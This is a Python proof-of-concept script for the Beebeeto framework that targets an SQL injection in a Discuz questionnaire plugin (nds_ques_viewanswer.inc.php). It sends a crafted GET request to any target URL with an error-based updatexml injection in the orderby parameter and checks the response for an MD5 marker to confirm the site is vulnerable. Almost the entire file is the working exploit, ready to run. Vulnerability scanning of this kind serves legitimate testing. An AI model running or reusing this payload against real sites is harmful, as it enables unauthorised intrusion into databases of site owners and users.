#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0107',
            'name': 'Discuz 问卷调查插件 /nds_ques_viewanswer.inc.php SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2015-06-04',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['Discuz问卷调查专业版插件注入', '/nds_ques_viewanswer.inc.php', 'php'],
            'desc': 'Discuz plugin sql injection vulnerability.',
            'references': ['http://0day5.com/archives/3184',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ('/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline'
                   ' and 1=(updatexml(1,concat(0x27,md5(123)),1))--')
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if '202cb962ac59075b964b07152d234b70' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())